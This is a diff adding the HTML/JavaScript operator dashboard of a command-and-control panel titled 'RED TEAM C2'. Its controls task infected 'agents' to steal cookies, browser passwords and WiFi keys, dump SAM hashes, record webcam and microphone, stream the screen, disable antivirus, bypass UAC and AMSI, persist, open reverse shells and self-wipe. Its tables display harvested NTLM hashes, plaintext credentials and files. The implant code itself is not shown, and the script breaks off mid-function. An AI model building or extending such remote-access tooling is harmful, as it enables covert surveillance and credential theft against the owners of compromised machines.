@@ -1,0 +1,758 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RED TEAM C2 | COMMAND CENTER</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+:root {
+  --bg: #0a0a0f; --card: #111118; --border: #1e1e2e;
+  --red: #e63946; --green: #06d6a0; --yellow: #ffd166; --blue: #4cc9f0;
+  --text: #e2e8f0; --dim: #64748b; --glow: rgba(230,57,70,0.25);
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; }
+
+/* Sidebar - fixed, never moves */
+.sidebar { position: fixed; top: 0; left: 0; width: 220px; height: 100vh; background: var(--card); border-right: 1px solid var(--border); padding: 1.5rem 1rem; display: flex; flex-direction: column; gap: .2rem; z-index: 100; overflow-y: auto; }
+.logo { font-size: 1.1rem; font-weight: 700; color: var(--red); padding: .75rem .5rem 1.5rem; letter-spacing: 1px; display: flex; align-items: center; gap: 8px; }
+.nav-link { display: flex; align-items: center; gap: 10px; padding: .65rem 1rem; border-radius: 8px; color: var(--dim); text-decoration: none; font-size: .875rem; font-weight: 600; cursor: pointer; transition: all .2s; }
+.nav-link:hover { color: var(--text); background: var(--border); }
+.nav-link.active { color: var(--red); background: rgba(230,57,70,.1); }
+.sidebar-footer { margin-top: auto; font-size: .7rem; color: var(--dim); padding: .5rem; border-top: 1px solid var(--border); padding-top: 1rem; }
+
+/* Main - offset by sidebar width, scrolls naturally */
+.main { margin-left: 220px; min-height: 100vh; }
+.top-bar { position: sticky; top: 0; z-index: 99; padding: 1rem 2rem; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; background: var(--card); width: 100%; }
+.content-area { padding: 2rem; }
+.section { display: none; max-width: 1200px; margin: 0 auto; animation: fadeIn 0.3s ease-out; }
+.section.active { display: block; }
+@keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
+
+h1 { font-size: 1.75rem; font-weight: 800; margin-bottom: 1.5rem; color: #fff; }
+
+/* UI Cards */
+.card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 1.5rem; margin-bottom: 1.5rem; position: relative; }
+.card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.25rem; }
+.card-title { font-size: 0.9rem; font-weight: 700; color: var(--dim); text-transform: uppercase; letter-spacing: 1px; }
+
+/* Grids */
+.grid { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 1.5rem; }
+.span2 { grid-column: span 2; }
+
+/* Tables */
+table { width: 100%; border-collapse: collapse; font-size: .85rem; }
+th { text-align: left; padding: .75rem 1rem; color: var(--dim); border-bottom: 1px solid var(--border); font-size: .7rem; text-transform: uppercase; font-weight: 800; }
+td { padding: .85rem 1rem; border-bottom: 1px solid var(--border); }
+.online { color: var(--green); font-weight: 700; }
+.stale { color: var(--dim); }
+
+/* Terminal */
+.terminal { background: #000; border: 1px solid var(--border); border-radius: 10px; height: 400px; overflow-y: auto; padding: 1.25rem; font-family: 'JetBrains Mono', monospace; font-size: .8rem; }
+.t-prompt { color: var(--red); font-weight: 700; }
+.t-out { color: #ccc; white-space: pre-wrap; word-wrap: break-word; margin-bottom: 1rem; border-left: 1px solid var(--border); padding-left: 12px; margin-top: 4px; }
+
+/* Forms */
+input, select { background: var(--bg); border: 1px solid var(--border); color: #fff; padding: .8rem; border-radius: 8px; outline: none; }
+.btn { display: inline-flex; align-items: center; justify-content: center; gap: 8px; background: var(--red); color: #fff; border: none; padding: .8rem 1.2rem; border-radius: 8px; font-weight: 700; cursor: pointer; transition: 0.2s; font-size: 0.85rem; }
+.btn:hover { filter: brightness(1.1); }
+.btn-ghost { background: transparent; border: 1px solid var(--border); color: var(--dim); }
+.btn-sm { padding: 0.4rem 0.8rem; font-size: 0.75rem; }
+.btn-error { color: var(--red); border-color: var(--red); }
+.btn-warning { color: var(--yellow); border-color: var(--yellow); }
+.btn-success { color: var(--green); border-color: var(--green); }
+
+.cat-label { font-size: .65rem; color: var(--dim); text-transform: uppercase; margin-top: 1.5rem; margin-bottom: 0.5rem; font-weight: 800; opacity: 0.7; }
+
+/* File Browser */
+.file-list-container { min-height: 400px; background: #000; border: 1px solid var(--border); border-radius: 8px; }
+.file-item { display: grid; grid-template-columns: 40px 1fr 100px 160px 100px; align-items: center; padding: 0.75rem 1rem; border-bottom: 1px solid var(--border); cursor: pointer; font-size: 0.85rem; transition: background 0.1s; }
+.file-item:hover { background: rgba(255,255,255,0.05); }
+.file-icon { color: var(--blue); font-size: 1.1rem; }
+.file-actions { opacity: 0; display: flex; gap: 8px; }
+.file-item:hover .file-actions { opacity: 1; }
+
+/* Gallery */
+.gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 1.5rem; }
+.gallery-item { background: var(--card); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; }
+.gallery-item img { width: 100%; display: block; border-bottom: 1px solid var(--border); cursor: zoom-in; }
+.gallery-item p { padding: 0.75rem; font-size: .75rem; color: var(--dim); font-family: 'JetBrains Mono'; text-align: center; }
+
+/* Scrollbar styling */
+::-webkit-scrollbar { width: 6px; }
+::-webkit-scrollbar-track { background: var(--bg); }
+::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+::-webkit-scrollbar-thumb:hover { background: var(--dim); }
+</style>
+</head>
+<body>
+
+<div class="sidebar">
+  <div class="logo"><i class="fas fa-biohazard"></i> RED TEAM C2</div>
+  <a class="nav-link active" onclick="show('dashboard', this)"><i class="fas fa-desktop"></i> Dashboard</a>
+  <a class="nav-link" onclick="show('payloads', this)"><i class="fas fa-microchip"></i> Payloads</a>
+  <a href="#" class="nav-link" onclick="show('operations', this)"><i class="fas fa-terminal"></i> Operations</a>
+  <a href="#" class="nav-link" onclick="show('creds', this)"><i class="fas fa-key"></i> Credentials</a>
+  <a href="#" class="nav-link" onclick="show('vnc', this)"><i class="fas fa-eye"></i> Live VNC</a>
+  <a href="#" class="nav-link" onclick="show('network', this)"><i class="fas fa-network-wired"></i> Network Map</a>
+  <a href="#" class="nav-link" onclick="show('harvest', this)"><i class="fas fa-briefcase"></i> Smart Harvester</a>
+  <a href="#" class="nav-link" onclick="show('files', this)"><i class="fas fa-folder-open"></i> File Browser</a>
+  <a href="#" class="nav-link" onclick="show('gallery', this)"><i class="fas fa-images"></i> Gallery</a>
+  <a class="nav-link" onclick="show('tunnels', this)"><i class="fas fa-link"></i> Tunnels</a>
+  <a class="nav-link" onclick="show('settings', this)"><i class="fas fa-cog"></i> Settings</a>
+  <div class="sidebar-footer">v2.5.2-STABLE</div>
+</div><div class="main">
+  <div class="top-bar">
+      <div style="font-weight: 700; color: var(--dim); font-size: 0.85rem; text-transform: uppercase;">Command Control</div>
+      <div style="display: flex; align-items: center; gap: 1rem;">
+          <span style="font-size: 0.75rem; font-weight: 700; color: var(--dim);">ACTIVE TARGET:</span>
+          <select id="global-agent-select" style="width: 250px; margin-bottom: 0; padding: 0.5rem;" onchange="window.currentAgentId = this.value"></select>
+      </div>
+  </div>
+
+  <div class="content-area">
+      <!-- DASHBOARD -->
+      <div id="sec-dashboard" class="section active">
+        <h1>Command Center</h1>
+        <div class="grid">
+          </div>
+
+          <div class="card span2">
+            <div class="card-header"><span class="card-title">Connected Nodes</span></div>
+            <table>
+              <thead><tr>
+                <th>HOSTNAME</th>
+                <th>OS</th>
+                <th>IP</th>
+                <th>ENVIRONMENT</th>
+                <th>LAST CHECKIN</th>
+                <th>STATUS</th>
+                <th>ACTIONS</th>
+              </tr></thead>
+              <tbody id="agent-table"></tbody>
+            </table>
+          </div>
+          <div class="card">
+            <div class="card-header"><span class="card-title">Transmitter</span></div>
+            <form id="task-form" style="display: flex; flex-direction: column; gap: 10px;">
+              <input id="cmd-input" type="text" placeholder="Enter Command..." required style="margin-bottom:0">
+              <button class="btn" type="submit"><i class="fas fa-paper-plane"></i> SEND TASK</button>
+            </form>
+          </div>
+          <div class="card"><div class="terminal" id="log"></div></div>
+        </div>
+      </div>
+
+      <!-- PAYLOADS -->
+      <div id="sec-payloads" class="section">
+        <h1>Payload Center</h1>
+        <div class="grid">
+          <div class="card"><div class="card-header"><span class="card-title">PowerShell</span></div><div class="payload-box" onclick="copy('pay-ps')"><code id="pay-ps">...</code></div></div>
+          <div class="card"><div class="card-header"><span class="card-title">Python Agent</span></div><div class="payload-box" onclick="copy('pay-py-win')"><code id="pay-py-win">...</code></div></div>
+          <div class="card span2"><div class="card-header"><span class="card-title">Unix Stager</span></div><div class="payload-box" onclick="copy('pay-unix')"><code id="pay-unix">...</code></div></div>
+        </div>
+      </div>
+
+      <!-- OPERATIONS -->
+      <div id="sec-operations" class="section">
+        <h1>Operations</h1>
+
+        <!-- Terminal Log at top - always visible -->
+        <div class="card" style="margin-bottom:1.5rem;">
+          <div class="card-header">
+            <span class="card-title">Terminal Log</span>
+            <button class="btn btn-ghost btn-sm" onclick="document.getElementById('op-log').innerHTML='';" title="Clear Terminal"><i class="fas fa-trash-alt"></i> Clear</button>
+          </div>
+          <div class="terminal" id="op-log"></div>
+        </div>
+
+        <!-- Buttons -->
+        <div style="display:flex;flex-direction:column;gap:1.5rem;">
+          <div class="card">
+            <div class="cat-label">Recon</div>
+            <div style="display:flex;flex-wrap:wrap;gap:.4rem;">
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('arp -a')">ARP Scan</button>
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('netstat -ano')">Network</button>
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('@avcheck')">AV Check</button>
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('@privcheck')">Priv Check</button>
+            </div>
+            <div class="cat-label">Surveillance</div>
+            <div style="display:flex;flex-wrap:wrap;gap:.4rem;">
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('@screenshot')">Screenshot</button>
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('@vnc_start')">Start VNC</button>
+                <button class="btn btn-ghost btn-sm btn-error" onclick="sendOp('@vnc_stop')">Stop VNC</button>
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('@webcam')">Webcam</button>
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('@record_start')">Start Mic</button>
+                <button class="btn btn-ghost btn-sm btn-error" onclick="sendOp('@record_stop')">Stop Mic</button>
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('@history')">History</button>
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('@cookies')">Steal Cookies</button>
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('@vault')">Browser Creds</button>
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('@harvest')">Harvest Files</button>
+            </div>
+            <div class="cat-label">Pivoting</div>
+            <div style="display:flex;flex-wrap:wrap;gap:.4rem;">
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('@socks5')">SOCKS5 Node</button>
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('@revshell')">Reverse Shell</button>
+            </div>
+            <div class="cat-label">System Info</div>
+            <div style="display:flex;flex-wrap:wrap;gap:.4rem;">
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('@systeminfo')">System Info</button>
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('@processes')">Processes</button>
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('@installed')">Installed Apps</button>
+            </div>
+            <div class="cat-label">Network</div>
+            <div style="display:flex;flex-wrap:wrap;gap:.4rem;">
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('@wifi')">WiFi Passwords</button>
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('@netshare')">Net Shares</button>
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('@arp_scan')">ARP Scan</button>
+                <button class="btn btn-ghost btn-sm" onclick="promptPortScan()">Port Scan</button>
+                <button class="btn btn-ghost btn-sm" onclick="promptSmbSpray()" style="grid-column:span 2;">SMB Spray</button>
+            </div>
+            <div class="cat-label">Credential Attacks</div>
+            <div style="display:flex;flex-wrap:wrap;gap:.4rem;">
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('@sam')">Dump SAM</button>
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('@clipboard_watch')">Watch Clipboard</button>
+            </div>
+            <div class="cat-label">Post-Exploitation</div>
+            <div style="display:flex;flex-wrap:wrap;gap:.4rem;">
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('@elevate')">Elevate</button>
+                <button class="btn btn-ghost btn-sm btn-warning" onclick="sendOp('@disable_av')">Disable AV</button>
+                <button class="btn btn-ghost btn-sm btn-warning" onclick="sendOp('@lock_screen')">Lock Screen</button>
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('@hollow')">Hollow Process</button>
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('@uacbypass')">Silent UAC Bypass</button>
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('@amsi_bypass')">AMSI Bypass</button>
+                <button class="btn btn-ghost btn-sm btn-danger" onclick="sendOp('@melt')">Melt (Self-Wipe)</button>
+            </div>
+            <div class="cat-label">Surveillance (Elite)</div>
+            <div style="display:flex;flex-wrap:wrap;gap:.4rem;">
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('@live_audio')">Live Listen</button>
+            </div>
+            <div class="cat-label">Management</div>
+            <div style="display:flex;flex-wrap:wrap;gap:.4rem;">
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('@ad_recon')">AD Recon</button>
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('@persist')">Persist</button>
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('@persist_wmi')">Persist WMI</button>
+                <button class="btn btn-ghost btn-sm" onclick="sendOp('@persist_com')">Persist COM</button>
+                <button class="btn btn-ghost btn-sm btn-warning" onclick="sendOp('@restart')">Restart</button>
+                <button class="btn btn-ghost btn-sm btn-error" onclick="sendOp('@shutdown')">Shutdown</button>
+                <button class="btn btn-danger btn-sm" style="grid-column: span 2;" onclick="confirmDestruct()">Self Destruct</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- CREDENTIALS -->
+      <div id="sec-creds" class="section">
+        <h1>Credentials & Hashes</h1>
+        <div class="card">
+            <div id="hashes-list" style="overflow-x:auto;">
+                <table style="width:100%; border-collapse: collapse;">
+                    <thead style="background: rgba(255,255,255,0.05);">
+                        <tr>
+                            <th style="padding:12px; text-align:left;">AGENT</th>
+                            <th style="padding:12px; text-align:left;">USERNAME</th>
+                            <th style="padding:12px; text-align:left;">RID</th>
+                            <th style="padding:12px; text-align:left;">NTLM HASH</th>
+                            <th style="padding:12px; text-align:left;">DATE</th>
+                        </tr>
+                    </thead>
+                    <tbody id="hashes-body"></tbody>
+                </table>
+            </div>
+        </div>
+
+        <div class="card">
+            <h3>Browser Passwords</h3>
+            <div style="overflow-x:auto;">
+                <table style="width:100%; border-collapse: collapse;">
+                    <thead style="background: rgba(255,255,255,0.05);">
+                        <tr>
+                            <th style="padding:12px; text-align:left;">BROWSER</th>
+                            <th style="padding:12px; text-align:left;">URL / DOMAIN</th>
+                            <th style="padding:12px; text-align:left;">USERNAME</th>
+                            <th style="padding:12px; text-align:left;">PASSWORD</th>
+                            <th style="padding:12px; text-align:left;">DATE</th>
+                        </tr>
+                    </thead>
+                    <tbody id="vault-body"></tbody>
+                </table>
+            </div>
+        </div>
+      </div>
+
+      <!-- NETWORK MAP -->
+      <div id="sec-network" class="section">
+        <h1>Network Map & Pivot</h1>
+        <div class="card">
+            <div id="hosts-list" style="overflow-x:auto;">
+                <table style="width:100%; border-collapse: collapse;">
+                    <thead style="background: rgba(255,255,255,0.05);">
+                        <tr>
+                            <th style="padding:12px; text-align:left;">IP ADDRESS</th>
+                            <th style="padding:12px; text-align:left;">MAC ADDRESS</th>
+                            <th style="padding:12px; text-align:left;">DISCOVERED BY</th>
+                            <th style="padding:12px; text-align:left;">STATUS</th>
+                            <th style="padding:12px; text-align:left;">ACTIONS</th>
+                        </tr>
+                    </thead>
+                    <tbody id="hosts-body">
+                        <!-- Filled by JS -->
+                    </tbody>
+                </table>
+            </div>
+        </div>
+      </div>
+
+      <!-- LIVE VNC -->
+      <div id="sec-vnc" class="section">
+        <h1>Live VNC Feed</h1>
+        <div class="card" style="padding:0; background:#000; display:flex; justify-content:center; align-items:center; min-height:600px; position:relative;">
+            <img id="vnc-frame" src="" style="max-width:100%; max-height:80vh; object-fit:contain; border: 1px solid #333;">
+            <div style="position:absolute; top:10px; right:10px; background:rgba(0,0,0,0.7); padding:5px 10px; border-radius:5px; font-size:0.75rem; color:var(--green);">
+                <i class="fas fa-circle" style="font-size:0.6rem; margin-right:5px; animation: blink 1s infinite;"></i> LIVE
+            </div>
+        </div>
+        <div style="margin-top:1rem; display:flex; gap:10px;">
+            <button class="btn btn-ghost" onclick="sendOp('@vnc_start')">START AGENT VNC</button>
+            <button class="btn btn-danger" onclick="sendOp('@vnc_stop')">STOP AGENT VNC</button>
+            <button class="btn btn-ghost" onclick="sendOp('@screenshot')">FORCE SNAPSHOT</button>
+        </div>
+        <div class="card">
+            <h3>Operational Controls</h3>
+            <button class="btn" style="width:100%" onclick="generateReport()"><i class="fas fa-file-pdf"></i> GENERATE FULL REPORT</button>
+        </div>
+      </div>
+
+      <!-- SMART HARVESTER -->
+      <div id="sec-harvest" class="section">
+        <h1>Smart File Harvester</h1>
+        <div class="card">
+            <div style="overflow-x:auto;">
+                <table style="width:100%; border-collapse: collapse;">
+                    <thead style="background: rgba(255,255,255,0.05);">
+                        <tr>
+                            <th style="padding:12px; text-align:left;">CATEGORY</th>
+                            <th style="padding:12px; text-align:left;">FILENAME</th>
+                            <th style="padding:12px; text-align:left;">SIZE</th>
+                            <th style="padding:12px; text-align:left;">ORIGINAL PATH</th>
+                            <th style="padding:12px; text-align:left;">AGENT</th>
+                        </tr>
+                    </thead>
+                    <tbody id="harvest-body"></tbody>
+                </table>
+            </div>
+        </div>
+      </div>
+
+      <!-- FILE BROWSER -->
+      <div id="sec-files" class="section">
+        <h1>File Browser</h1>
+        <div class="card">
+            <div style="display:flex; gap:10px; margin-bottom:1rem;">
+                <button class="btn btn-ghost btn-sm" onclick="browseFiles('..')"><i class="fas fa-arrow-up"></i></button>
+                <input type="text" id="current-path" style="flex:1; margin-bottom:0;" placeholder="C:\Users\..." onkeydown="if(event.key==='Enter') browseFiles(this.value)">
+                <button class="btn btn-sm" onclick="browseFiles(document.getElementById('current-path').value)">GOTO</button>
+            </div>
+            <div id="file-list-header" class="file-item" style="font-weight:700; color:var(--dim); cursor:default; background:rgba(255,255,255,0.02)">
+                <div></div><div>NAME</div><div>SIZE</div><div>MODIFIED</div><div></div>
+            </div>
+            <div id="file-list" class="file-list-container">
+                <p style="padding: 3rem; text-align:center; color:var(--dim)">Please select an active target from the top bar to begin.</p>
+            </div>
+        </div>
+      </div>
+
+      <!-- GALLERY -->
+      <div id="sec-gallery" class="section">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.5rem;">
+            <h1>Visual Intelligence Gallery</h1>
+            <div style="display: flex; gap: 10px;">
+                <button class="btn btn-ghost" onclick="loadScreenshots()"><i class="fas fa-sync"></i> REFRESH</button>
+                <button class="btn btn-error" onclick="nukeScreenshots()"><i class="fas fa-trash-alt"></i> NUKE GALLERY</button>
+            </div>
+        </div>
+        <div class="gallery" id="gallery"></div>
+      </div>
+
+      <!-- TUNNELS -->
+      <div id="sec-tunnels" class="section">
+          <h1>Tunnels</h1>
+          <div class="grid">
+              <div class="card">
+                  <div class="card-header"><span class="card-title">Ngrok</span></div>
+                  <input id="ngrok-token" type="password" placeholder="NGROK Authtoken">
+                  <div style="display:flex; gap:10px;">
+                      <button class="btn" id="btn-start-tunnel" onclick="toggleTunnel(true)">START</button>
+                      <button class="btn btn-ghost" id="btn-stop-tunnel" onclick="toggleTunnel(false)" style="display:none;">STOP</button>
+                  </div>
+              </div>
+              <div class="card">
+                  <div class="card-header"><span class="card-title">Status</span></div>
+                  <p>NGROK: <span id="tunnel-status-text" class="stale">INACTIVE</span></p>
+                  <p id="tunnel-url-box" style="display:none; margin-top:10px;">URL: <code id="tunnel-public-url" style="color:var(--green)">-</code></p>
+              </div>
+          </div>
+      </div>
+      
+      <div id="sec-settings" class="section">
+          <h1>Settings</h1>
+          <div class="card"><p>C2 URL: <code id="srv-url" style="color:var(--green)">...</code></p></div>
+      </div>
+  </div>
+</div>
+
+<script>
+window.currentAgentId = "";
+window.seenResults = {};
+
+function show(name, el) {
+    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+    document.querySelectorAll('.nav-link').forEach(a => a.classList.remove('active'));
+    document.getElementById('sec-' + name).classList.add('active');
+    if (el) el.classList.add('active');
+    if (name === 'gallery') loadScreenshots();
+    if (name === 'tunnels') loadTunnelStatus();
+    if (name === 'creds') loadHashes();
+    if (name === 'network') loadNetworkMap();
+    if (name === 'vnc') startVncStream();
+    else stopVncStream();
+    if (name === 'harvest') loadHarvested();
+    if (name === 'files' && window.currentAgentId) browseFiles('.');
+}
+
+let vncInterval = null;
+function startVncStream() {
+    if (vncInterval) return;
+    vncInterval = setInterval(() => {
+        if (!window.currentAgentId) return;
+        // Fetch the most recent screenshot for this agent
+        fetch(`/admin/vnc/latest?agent_id=${window.currentAgentId}`)
+            .then(r => r.json())
+            .then(data => {
+                if (data.url) {
+                    document.getElementById('vnc-frame').src = data.url + "?t=" + new Date().getTime();
+                }
+            });
+    }, 1000);
+}
+
+function stopVncStream() {
+    clearInterval(vncInterval);
+    vncInterval = null;
+}
+
+function loadHashes() {
+    fetch('/admin/hashes').then(r => r.json()).then(data => {
+        const body = document.getElementById('hashes-body');
+        body.innerHTML = '';
+        data.forEach(h => {
+            const date = new Date(h.created_at * 1000).toLocaleString();
+            body.innerHTML += `
+                <tr style="border-bottom: 1px solid rgba(255,255,255,0.05);">
+                    <td style="padding:12px;">${h.agent_id}</td>
+                    <td style="padding:12px; font-weight:700;">${h.username}</td>
+                    <td style="padding:12px;">${h.rid}</td>
+                    <td style="padding:12px;"><code class="ntlm-hash" onclick="copyText('${h.ntlm_hash}')" style="cursor:pointer; color:var(--green)">${h.ntlm_hash}</code></td>
+                    <td style="padding:12px; color:var(--dim); font-size:0.85rem;">${date}</td>
+                </tr>
+            `;
+        });
+    });
+    loadVault();
+}
+
+function loadVault() {
+    fetch('/admin/vault').then(r => r.json()).then(data => {
+        const body = document.getElementById('vault-body');
+        body.innerHTML = data.length === 0 ? '<tr><td colspan="5" style="padding:3rem; text-align:center; color:var(--dim)">Run @vault on a target to extract web passwords.</td></tr>' : '';
+        data.forEach(v => {
+            const date = new Date(v.created_at * 1000).toLocaleString();
+            body.innerHTML += `
+                <tr style="border-bottom: 1px solid rgba(255,255,255,0.05);">
+                    <td style="padding:12px;"><span class="badge">${v.browser}</span></td>
+                    <td style="padding:12px; font-size:0.85rem; color:var(--dim)">${v.url}</td>
+                    <td style="padding:12px; font-weight:700;">${v.username}</td>
+                    <td style="padding:12px;"><code class="ntlm-hash" onclick="copyText('${v.password}')" style="cursor:pointer; color:var(--green)">${v.password}</code></td>
+                    <td style="padding:12px; color:var(--dim); font-size:0.85rem;">${date}</td>
+                </tr>
+            `;
+        });
+    });
+}
+
+function loadHarvested() {
+    fetch('/admin/harvested').then(r => r.json()).then(data => {
+        const body = document.getElementById('harvest-body');
+        body.innerHTML = data.length === 0 ? '<tr><td colspan="5" style="padding:3rem; text-align:center; color:var(--dim)">No sensitive files harvested yet. Run @harvest.</td></tr>' : '';
+        data.forEach(f => {
+            body.innerHTML += `
+                <tr style="border-bottom: 1px solid rgba(255,255,255,0.05);">
+                    <td style="padding:12px;"><span class="badge badge-dim">${f.category}</span></td>
+                    <td style="padding:12px; font-weight:700; color:var(--green)">${f.filename}</td>
+                    <td style="padding:12px;">${(f.size/1024).toFixed(1)} KB</td>
+                    <td style="padding:12px; font-size:0.8rem; color:var(--dim)">${f.path}</td>
+                    <td style="padding:12px; font-size:0.85rem;">${f.agent_id}</td>
+                </tr>
+            `;
+        });
+    });
+}
+
+function loadNetworkMap() {
+    fetch('/admin/network_map').then(r => r.json()).then(data => {
+        const body = document.getElementById('hosts-body');
+        body.innerHTML = '';
+        if (data.length === 0) {
+            body.innerHTML = '<tr><td colspan="5" style="padding:3rem; text-align:center; color:var(--dim)">No hosts discovered yet. Run @arp_scan on a target.</td></tr>';
+            return;
+        }
+        data.forEach(h => {
+            body.innerHTML += `
+                <tr style="border-bottom: 1px solid rgba(255,255,255,0.05);">
+                    <td style="padding:12px; color:var(--green); font-weight:700;">${h.ip_addr}</td>
+                    <td style="padding:12px;">${h.mac_addr}</td>
+                    <td style="padding:12px; color:var(--dim);">${h.agent_id}</td>
+                    <td style="padding:12px;"><span class="badge badge-dim">Discovered</span></td>
+                    <td style="padding:12px;"><button class="btn btn-ghost btn-sm" onclick="sendOp('@port_scan ${h.ip_addr}')">SCAN</button></td>
+                </tr>
+            `;
+        });
+    });
+}
+
+function copyText(text) {
+    navigator.clipboard.writeText(text);
+    alert('Copied to clipboard!');
+}
+
+function loadTunnelStatus() {
+    fetch('/admin/tunnel/status').then(r => r.json()).then(data => {
+        const statusText = document.getElementById('tunnel-status-text');
+        const urlBox = document.getElementById('tunnel-url-box');
+        const btnStart = document.getElementById('btn-start-tunnel');
+        const btnStop = document.getElementById('btn-stop-tunnel');
+        if (data.active) {
+            statusText.innerText = 'ACTIVE'; statusText.className = 'online';
+            urlBox.style.display = 'block'; document.getElementById('tunnel-public-url').innerText = data.url;
+            btnStart.style.display = 'none'; btnStop.style.display = 'block';
+        } else {
+            statusText.innerText = 'INACTIVE'; statusText.className = 'stale';
+            urlBox.style.display = 'none'; btnStart.style.display = 'block'; btnStop.style.display = 'none';
+        }
+    });
+}
+
+function toggleTunnel(start) {
+    const endpoint = start ? '/admin/tunnel/start' : '/admin/tunnel/stop';
+    const token = document.getElementById('ngrok-token').value;
+    fetch(endpoint, { method: 'POST', headers: {'Content-Type':'application/json'}, body: (start && token) ? JSON.stringify({token}) : null })
+    .then(r => r.json()).then(() => { loadTunnelStatus(); setTimeout(loadInfo, 1000); });
+}
+
+function log(agent, msg, targetId = 'log') {
+    const el = document.getElementById(targetId);
+    if (!el) return;
+    const d = document.createElement('div');
+    d.innerHTML = `<span class="t-prompt">[${agent}]</span><div class="t-out">${msg}</div>`;
+    el.appendChild(d); el.scrollTop = el.scrollHeight;
+}
+
+function browseFiles(path) {
+    if (!window.currentAgentId) return alert("Select an active target in the top bar.");
+    fetch(`/admin/files/list?agent_id=${window.currentAgentId}&path=${encodeURIComponent(path)}`)
+    .then(r => r.json()).then(data => data.status === 'success' ? log('system', 'Agent is listing: ' + path, 'log') : alert(data.message));
+}
+
+function renderFiles(data) {
+    const list = document.getElementById('file-list');
+    document.getElementById('current-path').value = data.path;
+    list.innerHTML = data.items.sort((a,b) => b.is_dir - a.is_dir).map(item => `
+        <div class="file-item" ondblclick="${item.is_dir ? `browseFiles('${data.path.replace(/\\/g, '/')}/${item.name}')` : ''}">
+            <div class="file-icon"><i class="fas fa-${item.is_dir ? 'folder' : 'file-alt'}"></i></div>
+            <div class="file-name">${item.name}</div>
+            <div class="file-size">${item.is_dir ? '--' : (item.size / 1024).toFixed(1) + ' KB'}</div>
+            <div class="file-date">${item.mtime}</div>
+            <div class="file-actions">
+                ${!item.is_dir ? `<button class="btn btn-ghost btn-sm" onclick="sendOp('@download ${data.path.replace(/\\/g, '/')}/${item.name}')"><i class="fas fa-download"></i></button>` : ''}
+                <button class="btn btn-ghost btn-sm btn-error" onclick="if(confirm('Delete?')) deleteRemoteFile('${data.path.replace(/\\/g, '/')}/${item.name}')"><i class="fas fa-trash"></i></button>
+            </div>
+        </div>
+    `).join('');
+}
+
+function deleteRemoteFile(path) {
+    fetch('/admin/files/delete', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({agent_id: window.currentAgentId, path}) });
+}
+
+
+
+
+function loadAgents() {
+    fetch('/admin/agents').then(r => r.status === 401 ? window.location.href='/login' : r.json())
+    .then(agents => {
+        if(!agents) return;
+        const now = Math.floor(Date.now() / 1000);
+        document.getElementById('agent-table').innerHTML = agents.map(a => {
+            const lastSeen = Math.floor(Date.now() / 1000) - a.last_checkin;
+            const online = lastSeen < 120;
+            const sandboxText = a.is_sandbox ? ' <span style="color:#ff9800">[SANDBOX]</span>' : '';
+            const statusClass = online ? 'online' : 'stale';
+            const statusText = online ? 'ONLINE' : 'OFFLINE';
+            
+            return `<tr>
+                <td style="font-weight:700">${a.hostname}${sandboxText}</td>
+                <td style="color:var(--dim)">${a.os}</td>
+                <td>${a.ip_addr || a.ip || "unknown"}</td>
+                <td>${a.is_admin ? '<span style="color:var(--red); font-weight:700">ADMIN</span>' : 'User'}</td>
+                <td>${new Date(a.last_checkin*1000).toLocaleTimeString()}</td>
+                <td><span class="badge ${statusClass}">${statusText}</span></td>
+                <td><button class="btn btn-ghost btn-sm btn-error" onclick="nuke('${a.id}')">NUKE</button></td>
+            </tr>`;
+        }).join('');
+        
+        const oldVal = document.getElementById('global-agent-select').value;
+        const opts = '<option value="" disabled selected>Select Agent...</option>' + agents.map(a => `<option value="${a.id}">${a.hostname} (${a.ip_addr || a.ip || "?"})</option>`).join('');
+        document.getElementById('global-agent-select').innerHTML = opts;
